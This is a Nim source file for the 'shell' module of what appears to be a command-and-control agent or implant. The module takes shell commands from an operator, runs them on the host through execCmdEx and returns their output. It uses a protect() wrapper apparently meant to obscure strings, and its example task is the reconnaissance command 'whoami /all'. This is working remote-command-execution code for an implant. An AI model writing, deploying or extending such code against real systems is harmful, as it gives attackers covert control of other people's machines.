import ../common/[types, utils]

# Define function prototype
proc executeShell(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let module* = Module(
    name: protect("shell"), 
    description: protect("Execute shell commands or programs."),
    moduleType: MODULE_SHELL,
    commands: @[
        Command(
            name: protect("shell"),
            commandType: CMD_SHELL,
            description: protect("Execute a shell command and retrieve the output."),
            example: protect("shell whoami /all"),
            arguments: @[
                Argument(name: protect("command"), description: protect("Command to be executed."), argumentType: STRING, isRequired: true),
                Argument(name: protect("arguments"), description: protect("Arguments to be passed to the command."), argumentType: STRING, isRequired: false)
            ],
            execute: executeShell
        )
    ]
)  

# Implement execution functions
when not defined(agent):
    proc executeShell(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import osproc, strutils, strformat
    import ../agent/utils/io
    import ../agent/protocol/result
    import ../common/utils
    
    proc executeShell(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                command: string 
                arguments: string

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the command has been passed as an argument
                command = Bytes.toString(task.args[0].data)
                arguments = ""
            else: # The optional 'arguments' parameter was included
                command = Bytes.toString(task.args[0].data)

                for arg in task.args[1..^1]: 
                    arguments &= Bytes.toString(arg.data) & " "

            print fmt"   [>] Executing command: {command} {arguments}"

            let (output, status) = execCmdEx(fmt("{command} {arguments}")) 

            if output != "":
                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
            else: 
                return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
